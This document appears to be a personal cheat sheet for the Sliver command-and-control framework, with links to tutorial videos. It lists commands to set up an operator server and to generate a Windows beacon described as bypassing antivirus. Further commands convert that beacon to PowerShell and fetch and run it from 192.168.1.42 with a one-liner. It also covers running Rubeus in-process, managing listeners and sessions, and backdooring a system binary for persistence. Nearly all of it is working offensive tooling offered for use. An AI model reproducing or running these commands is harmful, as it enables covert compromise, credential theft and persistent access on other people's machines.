<https://www.youtube.com/watch?app=desktop&v=FYWGhdaDcZo>
<https://www.youtube.com/watch?v=eZOeF-3qMtg>
<https://www.youtube.com/watch?v=eotEvAZw5Lc&list=PL0UJtYdHHM46sIZbkieIe6BhKzfu4QOI9&index=4>
### Setup:
```
./sliver-server
new-operator --name arcos --lhost localhost
multiplayer
armory install all
```
### Payload beacon, bypasses AV:
```generate beacon --os windows --arch amd64 -m 192.168.1.42:53 -f shellcode -s /tmp/uwu.bin --skip-symbols -S 5```

```
msfvenom -p generic/custom payloadfile=/tmp/uwu.bin -a x64 -f psh -o /tmp/uwu.ps1
```
```
iex (iwr -usebasicparsing <http://192.168.1.42/uwu.ps1>[)]
```
### Assemly in process execution:
```execute-assembly -i -E /opt/tools/windows_privesc/Rubeus.exe klist```
### Listeners, status, and navigation:
```
mtls -l 53
https -l 443
jobs
beacons
shell
```

```
beacons rm
session -K
```
### Persistance (incomplete):
```profiles new --format shellcode --mtls 192.168.1.42:53 profile1```
```backdoor --profile profile1 "c:\windows\system32\calc.exe"```